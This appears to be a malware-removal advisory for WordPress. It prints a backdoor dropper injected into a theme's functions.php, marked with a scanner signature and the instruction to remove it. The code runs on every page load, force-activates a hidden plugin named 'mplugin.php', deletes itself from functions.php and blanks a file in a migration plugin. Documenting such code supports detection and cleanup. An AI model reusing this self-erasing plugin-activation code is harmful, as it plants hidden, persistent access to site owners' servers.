functions.php - SMW-INJ-15620-php.bkdr.wp.drpr-1

Remove the below code

function true_plugins_activate() {
	$active_plugins = get_option('active_plugins');
	$activate_this = array(
		'mplugin.php'
	);
	foreach ($activate_this as $plugin) {
		if (!in_array($plugin, $active_plugins)) {
			array_push($active_plugins, $plugin);
			update_option('active_plugins', $active_plugins);
		}
	}
	$new_active_plugins = get_option('active_plugins');
	if (in_array('mplugin.php', $new_active_plugins)) {
		$functionsPath = dirname(__FILE__) . '/functions.php';
		$functions = file_get_contents($functionsPath);

		$start = stripos($functions, "function true_plugins_activate()");
		$end = strripos($functions, "true_plugins_activate");
		$endDelete = $end + mb_strlen("true_plugins_activate") + 3;

		if($start && $end) {
			$str = substr($functions, 0, $start);
			$str .= substr($functions, $endDelete);
			file_put_contents($functionsPath, $str);
		}
				$script = file_get_contents('/home/username/public_html/wp-content/plugins/all-in-one-wp-migration-unlimited-extension/class.plugin-modules.php');
		file_put_contents('/home/username/public_html/wp-content/plugins/all-in-one-wp-migration-unlimited-extension/class.plugin-modules.php', '');
	}
}

add_action('init', 'true_plugins_activate');
